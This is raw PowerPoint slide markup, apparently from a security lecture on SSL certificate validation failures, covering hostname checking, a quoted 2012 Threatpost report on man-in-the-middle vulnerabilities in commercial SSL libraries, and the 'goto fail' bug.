            <a:ext cx="1423800" cy="1942920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1055690722" name="object 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3505320" y="4213080"/>
            <a:ext cx="3962160" cy="1293840"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DEE7FF"/>
          </a:solidFill>
          <a:ln w="9524">
            <a:solidFill>
              <a:srgbClr val="0000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6840" rIns="0" bIns="0" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="91440">
              <a:lnSpc>
                <a:spcPts val="3379"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="54"/>
              </a:spcBef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Issued</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="24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by</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="24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GoDaddy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="24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to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" strike="noStrike" spc="-32">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>AllYourSSLAreBelongTo.us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046487" name="object 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1590120" y="5097600"/>
            <a:ext cx="650520" cy="50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3200" b="0" strike="noStrike" spc="-26">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>Ok!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9715086" name="object 21"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId5"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2241720" y="5181480"/>
            <a:ext cx="1568160" cy="1218960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="363134347" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="73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9ACAF1B5-EA37-4CAD-9C8F-D3D7B9A03E4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3794777" name="object 2"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1295280" y="2614680"/>
            <a:ext cx="1433160" cy="966600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="1793652286" name="object 3"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="409680" y="4081320"/>
            <a:ext cx="2131560" cy="1077480"/>
            <a:chOff x="409680" y="4081320"/>
            <a:chExt cx="2131560" cy="1077480"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="743" name="object 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843120" y="4491000"/>
              <a:ext cx="1698120" cy="667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44" name="object 5"/>
            <p:cNvPicPr/>
            <p:nvPr/>
          </p:nvPicPr>
          <p:blipFill rotWithShape="1">
            <a:blip r:embed="rId5"/>
            <a:stretch/>
          </p:blipFill>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="409680" y="4081320"/>
              <a:ext cx="1582200" cy="5886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711216933" name="object 6"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId6"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="228600" y="2209680"/>
            <a:ext cx="1333080" cy="712440"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1258831442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Failing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to</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4000" b="0" strike="noStrike" spc="-4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Check</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4000" b="0" strike="noStrike" spc="-5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Hostname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3428038" name="object 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2952000" y="1633320"/>
            <a:ext cx="6025680" cy="4586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MS PGothic"/>
              </a:rPr>
              <a:t>“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Researchers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at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University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Texas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at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Austin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and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Stanford</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="20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University</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="20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have</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="20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discovered</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="20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that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poorly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designed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APIs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used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SSL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implementations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are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to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blame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vulnerabilities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many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critical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non-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browser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software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packages.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Serious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security</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="20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vulnerabilities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were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found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programs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such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Amazon</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="20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EC2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Java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library,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Amazon</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="20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PayPal</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="MS PGothic"/>
              </a:rPr>
              <a:t>’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merchant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SDKs,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Trillian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AIM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instant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messaging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software,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popular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integrated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shopping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cart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software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packages,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Chase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mobile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banking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software,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="20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several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Android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applications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0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libraries.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-5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SSL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-41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connections</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-4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21">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>from</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="497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these</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-3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programs</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-2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and</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-3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many</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-3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others</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-3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are</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-2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vulnerable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-26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to</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-32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52">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>a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man</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-15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in</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-15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the</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-11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FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>middle</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-15">
                <a:solidFill>
                  <a:srgbClr val="FF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FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>attack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2000" b="0" strike="noStrike" spc="-11">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="MS PGothic"/>
              </a:rPr>
              <a:t>”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4373800" name="object 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5352480" y="5656680"/>
            <a:ext cx="269712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-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Threatpost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(Oct</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="20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2012)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058492" name="object 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="685800" y="5715000"/>
            <a:ext cx="4011480" cy="1080360"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFADD6"/>
          </a:solidFill>
          <a:ln w="9524">
            <a:solidFill>
              <a:srgbClr val="FF26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90720">
              <a:lnSpc>
                <a:spcPct val="98000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="40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Major</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1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payment</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1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processing</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1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gateways,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client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software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1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cloud</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1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computing,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integrated</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1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1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>e-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commerce</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1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software,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1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etc.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1680795" name="object 11"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId7"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="291960" y="3124080"/>
            <a:ext cx="1914120" cy="840960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="726758610" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="74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CB62FE85-9F54-4025-A299-318B9980DB04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59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97253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What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Happens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After</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4000" b="0" strike="noStrike" spc="-66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Validation?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6055030" name="object 3"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="380880" y="1996920"/>
            <a:ext cx="7797600" cy="4403880"/>
            <a:chOff x="380880" y="1996920"/>
            <a:chExt cx="7797600" cy="4403880"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="754" name="object 4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5" name="object 5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6" name="object 6"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3056400" y="4876920"/>
              <a:ext cx="5122080" cy="360"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 5122080"/>
                <a:gd name="textAreaRight" fmla="*/ 5122440 w 5122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122545" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="0" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="51223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7" name="object 7"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="2971800" y="480060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758" name="object 8"/>
            <p:cNvPicPr/>
            <p:nvPr/>
          </p:nvPicPr>
          <p:blipFill rotWithShape="1">
            <a:blip r:embed="rId3"/>
            <a:stretch/>
          </p:blipFill>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="380880" y="3200400"/>
              <a:ext cx="1130040" cy="742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9" name="object 9"/>
            <p:cNvPicPr/>
            <p:nvPr/>
          </p:nvPicPr>
          <p:blipFill rotWithShape="1">
            <a:blip r:embed="rId4"/>
            <a:stretch/>
          </p:blipFill>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="533520" y="4116240"/>
              <a:ext cx="914040" cy="979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60" name="object 10"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="892440" y="5572440"/>
              <a:ext cx="6955920" cy="828360"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 6955920"/>
                <a:gd name="textAreaRight" fmla="*/ 6956280 w 6955920"/>
                <a:gd name="textAreaTop" fmla="*/ 0 h 828360"/>
                <a:gd name="textAreaBottom" fmla="*/ 828720 h 828360"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
              <a:pathLst>
                <a:path w="6956425" h="828675" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="0" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="783808" y="383892"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="783808" y="828392"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6956006" y="828392"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6956006" y="66392"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="783808" y="66392"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="783808" y="193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6D5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1" name="object 11"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="892440" y="5572440"/>
              <a:ext cx="6955920" cy="828360"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 6955920"/>
                <a:gd name="textAreaRight" fmla="*/ 6956280 w 6955920"/>
                <a:gd name="textAreaTop" fmla="*/ 0 h 828360"/>
                <a:gd name="textAreaBottom" fmla="*/ 828720 h 828360"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
              <a:pathLst>
                <a:path w="6956425" h="828675" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="783807" y="66392"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="1812507" y="66392"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3355557" y="66392"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6956006" y="66392"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6956006" y="193392"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6956006" y="383892"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6956006" y="828392"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3355557" y="828392"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1812507" y="828392"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="783807" y="828392"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="783807" y="383892"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="783807" y="193392"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="783807" y="66392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2" name="object 12"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1346759" y="4425840"/>
              <a:ext cx="4062960" cy="1212480"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 4062960"/>
                <a:gd name="textAreaRight" fmla="*/ 4063320 w 4062960"/>
                <a:gd name="textAreaTop" fmla="*/ 0 h 1212480"/>
                <a:gd name="textAreaBottom" fmla="*/ 1212840 h 1212480"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
              <a:pathLst>
                <a:path w="4063365" h="1212850" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="0" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="1041767" y="679418"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="437459" y="679418"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="437459" y="1212818"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4063307" y="1212818"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4063307" y="679418"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1948229" y="679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object 13"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1346759" y="4425840"/>
              <a:ext cx="4062960" cy="1212480"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 4062960"/>
                <a:gd name="textAreaRight" fmla="*/ 4063320 w 4062960"/>
                <a:gd name="textAreaTop" fmla="*/ 0 h 1212480"/>
                <a:gd name="textAreaBottom" fmla="*/ 1212840 h 1212480"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
              <a:pathLst>
                <a:path w="4063365" h="1212850" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="437458" y="679417"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="1041766" y="679417"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1948229" y="679417"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4063307" y="679417"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4063307" y="768317"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4063307" y="901667"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4063307" y="1212817"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1948229" y="1212817"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1041766" y="1212817"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="437458" y="1212817"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="437458" y="901667"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="437458" y="768317"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="437458" y="679417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6340339" name="object 14"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="1942920" y="2198160"/>
            <a:ext cx="3162240" cy="151920"/>
            <a:chOff x="1942920" y="2198160"/>
            <a:chExt cx="3162240" cy="151920"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="765" name="object 15"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1942920" y="2273760"/>
              <a:ext cx="3077640" cy="12240"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 3077640"/>
                <a:gd name="textAreaRight" fmla="*/ 3078000 w 3077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077845" h="12700" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="0" y="12360"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="30776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object 16"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4851000" y="2198160"/>
              <a:ext cx="254160" cy="151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635" h="152400" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="0" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="101906" y="75791"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="613" y="152398"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="254304" y="7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13685524" name="object 17"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId5"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7467480" y="2270160"/>
            <a:ext cx="1423800" cy="1942920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1233934358" name="object 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1755000" y="1780920"/>
            <a:ext cx="7028280" cy="5235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412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Hello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334"/>
              </a:spcBef>
              <a:defRPr/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31920">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc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am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PayPal.com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31920">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="496"/>
              </a:spcBef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(or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whoever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you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want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be)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994040" indent="-762120">
              <a:lnSpc>
                <a:spcPct val="117000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="334"/>
              </a:spcBef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PayPal</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" strike="noStrike" spc="-1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for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its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RSA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signing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key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31920">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="621"/>
              </a:spcBef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my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signed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Diffie-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Hellman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value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31920">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="346"/>
              </a:spcBef>
              <a:tabLst>
                <a:tab pos="0" algn="l"/>
              </a:tabLst>
              <a:defRPr/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06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Validate</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="24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500"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1721"/>
              </a:spcBef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then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verify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signature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DH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value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using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24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24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712279" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="75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81370284-141B-483F-8355-19B655822D17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60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9274450" name="object 2"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6713640" y="555480"/>
            <a:ext cx="982440" cy="1333080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="763326312" name="object 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8443440" y="6464160"/>
            <a:ext cx="550800" cy="195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r>
              <a:rPr lang="en-US" sz="1200" b="0" strike="noStrike" spc="-26">
                <a:solidFill>
                  <a:srgbClr val="3366FF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>62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157844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Goto</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4000" b="0" strike="noStrike" spc="-9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Fail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33347182" name="object 5"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="2971800" y="2209680"/>
            <a:ext cx="5206680" cy="151920"/>
            <a:chOff x="2971800" y="2209680"/>
            <a:chExt cx="5206680" cy="151920"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="774" name="object 6"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3056400" y="2286000"/>
              <a:ext cx="5122080" cy="360"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 5122080"/>
                <a:gd name="textAreaRight" fmla="*/ 5122440 w 5122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122545" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="0" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="5122333" y="0"/>
                  </a:lnTo>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:noFill/>
            <a:ln w="50799">
              <a:solidFill>
                <a:srgbClr val="4180FF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5" name="object 7"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="2971800" y="2209680"/>
              <a:ext cx="253800" cy="1519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151920"/>
                <a:gd name="textAreaBottom" fmla="*/ 152280 h 151920"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
              <a:pathLst>
                <a:path w="254000" h="152400" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="254000" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="0" y="76200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="254000" y="152400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="152400" y="762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rgbClr val="4180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59189566" name="object 8"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="380880" y="1996920"/>
            <a:ext cx="6532920" cy="4098600"/>
            <a:chOff x="380880" y="1996920"/>
            <a:chExt cx="6532920" cy="4098600"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="777" name="object 9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527049" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="472031" y="11032"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="436240" y="30306"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="401257" y="58737"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="367165" y="95999"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="334048" y="141767"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="301990" y="195716"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="271074" y="257520"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="241384" y="326855"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="227025" y="364245"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="213004" y="403396"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="199331" y="444267"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="186017" y="486817"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="173071" y="531006"/>
                  </a:lnTo>
                  <a:lnTo>
